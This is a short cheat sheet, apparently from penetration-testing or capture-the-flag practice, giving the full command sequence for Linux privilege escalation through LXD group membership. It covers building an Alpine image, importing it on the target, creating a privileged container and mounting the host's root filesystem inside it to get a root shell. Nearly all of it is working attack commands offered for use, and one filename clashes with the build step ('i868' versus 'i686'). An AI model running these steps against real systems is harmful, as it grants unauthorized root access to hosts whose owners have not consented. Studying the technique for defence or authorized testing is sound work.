# LXD-Privesc-CheatSheet

-if you can't find the git here it is for reference

git clone https://github.com/saghul/lxd-alpine-builder.git
                                                                                                                                                                                                                                           
-first you wanna build the LXD image locally                                                                                                                                                                                                    
                                                                                                                                                                                                                                           
sudo ./build-alpine -a i686                                                                                                                                                                                                                
                                                                                                                                                                                                                                           
-After that is done it will make a gunzip and send that over to the target                                                                                                                                                                 
-Next we will run a slew of commands since we are already in the LXD group                                                                                                                                                                 
-If not you will need to add it to usermod                                                                                                                                                                                                 
-Now we run a slew of commands                                                                                                                                                                                                             
-This makes the LXD image on the target host                                                                                                                                                                                               
                                                                                                                                                                                                                                           
lxc image import alpine-v3.12-i868-20200831_1748.tar.gz --alias temper                                                                                                                                                                     
                                                                                                                                                                                                                                           
-Next we setup the LXD image on local with escalated priv 
-"temper" is the alias of the image
-"hereiam" is the alias of the user you are creating on the image
                                                                                                                                                                                                                                           
lxc init temper hereiam -c security.privileged=true                                                                                                                                                                                        
                                                                                                                                                                                                                                           
-Now you need to add a HD for example sometimes it will be in /mnt/root other times no                                                                                                                                                     
                                                                                                                                                                                                                                           
lxc config device add hereiam host-root disk source=/ path=/mnt/root recursive=true                                                                                                                                                        
                                                                                                                                                                                                                                           
-Lastly we start the LXD                                                                                                                                                                                                                   
                                                                                                                                                                                                                                           
lxc start hereiam                                                                                                                                                                                                                          
lxc exec hereiam /bin/sh    
